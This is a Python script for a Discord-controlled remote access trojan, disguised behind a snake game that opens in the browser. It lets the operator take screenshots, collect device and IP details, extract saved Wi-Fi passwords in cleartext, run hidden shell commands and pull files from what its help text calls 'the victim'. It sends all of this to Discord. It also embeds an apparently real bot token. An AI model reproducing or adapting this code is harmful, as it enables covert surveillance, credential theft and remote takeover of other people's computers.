from random import randint as rand
from requests import get
from pyautogui import screenshot, size
from io import BytesIO
from subprocess import check_output, STDOUT
from socket import gethostname, gethostbyname
import discord, webbrowser

print(f'Loading...')

parse = lambda inputStr: [{key: input_dict[key][i] for key in input_dict} for i in range(len(input_dict[list(input_dict.keys())[0]]))] if (input_dict := {key.strip(): values.strip() if key.strip() not in {k.strip() for k, _ in [[line.split(":")[0], ":".join(line.split(":")[1:])] for line in inputStr.split('\n') if ':' in line if line.strip()]} else [v.strip() for k, v in [[line.split(":")[0], ":".join(line.split(":")[1:])] for line in inputStr.split('\n') if ':' in line if line.strip()] if k.strip() == key.strip()] for key, *values in [line.split(':') for line in inputStr.split('\n') if ':' in line if line.strip()]}) else None

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    webbrowser.open("https://kiwuthegamer.github.io/Retro-Gamer/snake.html?diff=1")
    print("Loading complete")

@client.event
async def on_message(message:discord.Message):
    if message.author == client.user:
        return
    
    ctx = message.channel
    args = message.content.split(" ")[1:]
    # print(message.author.name+": "+message.content)
    
    try:
        if message.content in ['!help','!h']:
            await ctx.send("""`!help` or `!h` - Displays this menu
`!screenshot` or `!ss` - Takes and sends a screenshot
`!deviceinfo` or `!di` - Sends a snapshot of the device's info and details
`!networkinfo` or `!ni` - Sends a snapshot of the device's network info and details
`!cmd <command>` or `!c <command>` - Runs a command in the terminal (hidden)
`!fileupload <filepath>` or `!fu <filepath>` - Sends a file
`!update <?link>` or `!u <?link>` - Updates the script based on the web version
`!exit` - Exits the program (warning: it can only start again if the victim reopens the script)""")
        
        if message.content in ['!screenshot', '!ss']:
            ss = screenshot()
            with BytesIO() as image_binary:
                        ss.save(image_binary, 'PNG')
                        image_binary.seek(0)
                        await ctx.send(file=discord.File(fp=image_binary, filename='image.png'))
            
        if message.content in ['!deviceinfo', '!di']:
            hostName = gethostname()
            devInfo = f'''# Device Information
Device Name: {hostName}
Screen Resolution: {size().width}x{size().height}
Local IP Address: {gethostbyname(hostName)}
Public IP Address: {eval(get('https://httpbin.org/ip').content.decode())["origin"]}
'''
            await ctx.send(devInfo)

        if message.content in ['!networkinfo', '!ni']:
            interfaces = parse( check_output('netsh wlan show interfaces').decode() )
            netInfo = '''# Network Information
## Interfaces
{}
Password: {}
'''.format(
    "\n\n".join([ "\n".join([f'{attr}: {interface[attr]}' for attr in ["Name", "Description", "State", "SSID", "Band", "Signal", "Profile"]]) for interface in interfaces ]),
    "\n".join([ check_output("""powershell "(netsh wlan show profile name='"""+interface["SSID"]+"""' key=clear | Select-String 'Key Content' | ForEach-Object { $_ -replace 'Key Content\\s+:\\s+', '' }).Trim()" """).strip().decode() for interface in interfaces ])
    )
            await ctx.send(netInfo)

        if message.content.startswith(("!cmd", "!c")):
            if len(args) == 0:
                return await ctx.send("Please include a command!")
            command = " ".join(args)
            await ctx.send("Running Command...")
            output = check_output( command, stderr=STDOUT, shell=True, text=True )
            split = [output[i:i+1994] for i in range(0, len(output), 1994)]
            for msg in split:
                await ctx.send("```"+msg+"```")
            await ctx.send("Complete")

        if message.content.startswith(('!fileupload', '!fu')):
            await ctx.send(file=" ".join(args))
        
        if message.content == "!exit":
            await ctx.send("Exitting")
            quit()

    except Exception as err:
        await ctx.send(f"ERROR: {err}")

client.run('MTIwODAzNzcwMzMyNTg1MTY5OA.GXQf7Q.RvIWBRTwFJ4HR_MNba0nBMVHoyKmmDbKOKeqn0', log_handler=None)
